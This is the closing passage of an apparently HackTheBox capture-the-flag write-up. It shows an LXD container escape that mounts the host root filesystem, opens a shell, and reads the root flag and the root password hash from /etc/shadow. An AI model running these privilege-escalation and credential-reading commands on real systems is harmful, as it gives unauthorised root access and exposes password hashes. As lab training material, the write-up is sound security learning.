style="color:#F8F8F2"><span class="token plain">$ lxc config device add cyfun host-root disk source=/ path=/mnt/root recursive=true</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Execute the container:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lxc start cyfun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lxc exec cyfun /bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd /mnt/root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Loot:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># cat /mnt/root/root/root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3b89a121fa4338f7835fedb1f62b8cdc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># cat /mnt/root/etc/shadow | grep root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H/:18429:0:99999:7:::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/linux/">linux</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/recon/">recon</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/network/">network</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/exploit/">exploit</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/php/">php</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/lfi/">lfi</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/tomcat/">tomcat</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/SneakyMailer/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">SneakyMailer </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Tenet/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Tenet </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#http-enumeration" class="table-of-contents__link toc-highlight">HTTP enumeration</a></li><li><a href="#http-exploitation-lfi" class="table-of-contents__link toc-highlight">HTTP exploitation: LFI</a></li><li><a href="#http-exploitation-file-upload--rce" class="table-of-contents__link toc-highlight">HTTP exploitation: File upload &amp; RCE</a></li><li><a href="#system-enumeration" class="table-of-contents__link toc-highlight">System enumeration</a></li><li><a href="#privilege-escalation-of-machine--tomcat-to-ash" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : tomcat to ash</a></li><li><a href="#privilege-escalation-of-machine--ash-to-root" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : ash to root</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>